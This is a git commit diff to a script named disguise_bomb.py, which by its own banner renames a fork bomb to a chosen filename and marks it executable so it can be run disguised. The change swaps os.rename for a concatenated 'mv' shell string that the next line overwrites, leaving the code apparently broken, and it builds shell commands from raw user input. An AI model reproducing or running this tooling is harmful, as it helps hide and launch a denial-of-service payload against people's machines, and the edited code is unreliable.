2ae59041d9898fa4355e0428b540904314629a17
Gul'dan <92905002+K0K0SHA@users.noreply.github.com>
2023-07-07 06:21:56 -0400

    Update disguise_bomb.py

--- disguise_bomb.py
+++ disguise_bomb.py
@@ -6,7 +6,7 @@ print("Disguise and prepare fork bomb for execution.")
 new_name = input("Please enter a new filename including extension\n") # you can make weirdly named files like this
 if new_name:
     print("renaming...")
-    os.rename(fbomb_name, new_name)
+    cmdstr = "mv " + fbomb_name + " " + new_name
     cmdstr = "chmod +x "
     cmdstr += new_name
     print("executing: \n" + cmdstr)
